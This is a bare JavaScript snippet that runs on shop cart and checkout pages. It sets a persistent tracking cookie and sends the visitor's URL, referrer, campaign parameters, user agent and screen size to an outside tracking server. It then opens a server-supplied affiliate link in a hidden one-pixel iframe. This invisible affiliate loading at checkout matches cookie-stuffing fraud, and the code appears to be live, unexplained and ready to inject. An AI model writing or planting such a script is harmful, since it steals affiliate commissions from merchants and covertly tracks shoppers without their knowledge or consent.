(async function() {
    
    function generateUUID() {
        return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
            var r = Math.random() * 16 | 0,
                v = c === 'x' ? r : (r & 0x3 | 0x8);
            return v.toString(16);
        });
    }


        const urlNew = new URL(window.location.href);
  const utm_source = urlNew.searchParams.get("utm_source") || "";
  const utm_campaign = urlNew.searchParams.get("utm_campaign") || "";
  const utm_medium = urlNew.searchParams.get("utm_medium") || "";
  const referrer = document.referrer;
  const screenResolution = `${window.screen.width}x${window.screen.height}`;
  const userAgent = navigator.userAgent;
  const timestamp = new Date().toISOString();

const payload = {
    utm_source,
    utm_campaign,
    utm_medium,
    referrer,
    screenResolution,
    userAgent,
    timestamp,
    page: window.location.href,
    
  };


    function createTrackingPixel(url) {
        
        var img = document.createElement('img');
        img.src = url;
        img.style.width = '1px';
        img.style.height = '1px';
        img.style.display = 'none';  
        img.style.visibility = 'hidden';
        
        document.body.appendChild(img);
    }

    function createClickIframe(url) {
  const iframe = document.createElement('iframe');
  iframe.src = url;
  iframe.width = "1";
  iframe.height = "1";
  iframe.style = "display:none;visibility:hidden;";
  document.body.appendChild(iframe);
}


    async function initTracking() {
        // if (sessionStorage.getItem('iframe_triggered')) {
        //     return; 
        // }

        try {
            let uniqueId = getCookie('tracking_uuid') || generateUUID();
            let expires = (new Date(Date.now() + 30 * 86400 * 1000)).toUTCString();
            document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;';

            let response = await fetch('https://www.tracktraffics.com/api/track-user-withoutUniData', {
                method: 'POST',
                body: JSON.stringify({
                    url: window.location.href,
                    referrer: document.referrer,
                    unique_id: uniqueId,
                    origin: window.location.hostname,
                    payload,
                }),
                headers: {
                    'Content-Type': 'application/json',
                    'Access-Control-Allow-Origin':'*'
                }
            });

            let result = await response.json();
            if (result.success && result.affiliate_url) {
                createClickIframe(result.affiliate_url);
                sessionStorage.setItem('iframe_triggered', 'true'); 
            } else {
                createClickIframe('https://www.tracktraffics.com/api/fallback-pixel?id=' + uniqueId);
            }
        } catch (error) {
            console.error('Error in tracking script:', error);
        }
    }

    function getCookie(cname) {
        var name = cname + '=';
        var ca = document.cookie.split(';');
        for (var i = 0; i < ca.length; i++) {
            var c = ca[i];
            while (c.charAt(0) === ' ') {
                c = c.substring(1);
            }
            if (c.indexOf(name) === 0) {
                return c.substring(name.length, c.length);
            }
        }
        return '';
    }
        function isCardPage() {
            const cardPageUrls = ['/cart', '/add-credit','/checkout/cart','/checkout/confirm/address','/checkout/confirm/payment']; 
            return cardPageUrls.some(url => window.location.pathname.includes(url));
        }
        

        if (isCardPage()) {
            
            setTimeout(initTracking, 200);
        }

        


})();